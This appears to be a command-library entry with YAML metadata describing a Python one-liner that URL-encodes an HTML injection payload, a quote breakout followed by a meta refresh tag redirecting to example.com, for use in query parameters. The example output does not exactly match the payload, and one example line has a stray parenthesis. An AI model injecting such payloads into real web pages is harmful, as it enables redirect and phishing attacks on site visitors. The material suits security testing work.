---
id: cmd-uuid-3
data: >-
  python3 -c "import urllib.parse; print(urllib.parse.quote('\"\'><meta
  http-equiv=\"refresh\" content=\"1; http://example.com\">'))"
tags:
  - encode
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:47:23.618Z'
verified: false
validated: true
submitted: true
---
# url-encode-payload

## Command

```bash
python3 -c "import urllib.parse; print(urllib.parse.quote('\"\'><meta http-equiv=\"refresh\" content=\"1; http://example.com\">'))"
```

## Description

URL-encodes an HTML injection payload for safe inclusion in query parameters.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Payload | String to encode | Yes |

## Examples

### Basic Usage

```bash
python3 -c "import urllib.parse; print(urllib.parse.quote('\"\'><meta http-equiv=\"refresh\" content=\"1; http://example.com\">'))"
```

### Advanced Usage

```bash
python3 -c "import urllib.parse; print(urllib.parse.quote(input('Enter payload: ')))")
```

## Expected Output

Encoded string, e.g., %22%3E%3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%221%3B%20http%3A%2F%2Fexample.com%22%3E

## Related

- [[commands/echo-payload]]
